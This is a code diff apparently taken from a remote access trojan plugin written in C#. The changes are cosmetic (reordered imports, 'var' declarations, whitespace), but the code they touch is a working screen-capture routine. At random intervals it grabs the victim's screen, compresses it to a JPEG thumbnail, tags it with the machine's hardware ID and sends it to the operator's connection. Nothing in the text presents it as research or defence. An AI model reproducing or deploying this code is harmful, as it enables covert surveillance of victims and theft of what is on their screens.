@@ -1,13 +1,10 @@
-﻿using MessagePackLib.MessagePack;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using MessagePackLib.MessagePack;
 
 namespace Plugin.Handler
 {
@@ -23,20 +20,21 @@ namespace Plugin.Handler
                 while (Connection.IsConnected && !Packet.ctsThumbnails.IsCancellationRequested)
                 {
                     Thread.Sleep(new Random().Next(2500, 7000));
-                    Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-                    using (Graphics g = Graphics.FromImage(bmp))
-                    using (MemoryStream memoryStream = new MemoryStream())
+                    var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                    using (var g = Graphics.FromImage(bmp))
+                    using (var memoryStream = new MemoryStream())
                     {
                         g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
-                        Image thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
+                        var thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
                         thumb.Save(memoryStream, ImageFormat.Jpeg);
-                        MsgPack msgpack = new MsgPack();
+                        var msgpack = new MsgPack();
                         msgpack.ForcePathObject("Pac_ket").AsString = "thumbnails";
                         msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                         msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                         Connection.Send(msgpack.Encode2Bytes());
                         thumb.Dispose();
                     }
+
                     bmp.Dispose();
                 }
             }
@@ -44,8 +42,8 @@ namespace Plugin.Handler
             {
                 return;
             }
+
             Connection.Disconnected();
         }
     }
-
 }
